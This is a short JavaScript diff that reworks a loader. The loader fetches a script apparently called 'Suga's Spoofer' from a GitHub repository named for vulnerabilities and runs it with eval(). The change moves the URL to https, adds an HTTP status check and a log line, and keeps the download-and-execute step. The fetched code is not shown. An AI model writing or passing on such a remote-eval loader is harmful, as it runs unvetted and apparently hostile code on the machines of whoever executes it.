@@ -1,4 +1,12 @@
-fetch('http://raw.githubusercontent.com/SugaBlaz/SMPN-1-GABUS_VULNERABILITIES/refs/heads/main/Suga's%20Spoofer')
-  .then(response => response.text())
-  .then(code => eval(code))
-  .catch(err => console.error('Failed to load script:', err));
+fetch("https://raw.githubusercontent.com/SugaBlaz/SMPN-1-GABUS_VULNERABILITIES/refs/heads/main/Suga's%20Spoofer")
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    }
+    return response.text();
+  })
+  .then(code => {
+    console.log("Suga's Spoofer loaded:", code.length, "bytes");
+    eval(code);
+  })
+  .catch(err => console.error("Failed to load script:", err));
